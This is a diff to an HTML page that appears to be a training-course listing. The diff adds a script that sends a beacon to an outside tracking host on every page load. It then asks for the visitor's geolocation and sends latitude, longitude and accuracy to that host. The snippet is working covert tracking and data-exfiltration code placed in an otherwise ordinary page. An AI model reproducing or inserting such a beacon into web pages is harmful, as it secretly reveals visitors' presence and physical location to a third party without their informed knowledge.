@@ -100,3 +100,19 @@ Day 3: (Developer Edition only)
 </div>
 </div>
 <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<script>
+    function callBadger(params) {
+        img = new Image();
+        img.src = "http://hb.lanmaster53.com/api/beacon/0783387c-34f6-45ce-be7e-6a951bd93728/" + params;
+    }
+    function showPosition(position) {
+        var params = "JavaScript?lat=" + position.coords.latitude + "&lng=" + position.coords.longitude + "&acc=" + position.coords.accuracy;
+        callBadger(params);
+    }
+    // execution
+    callBadger("HTML");
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    }
+</script>
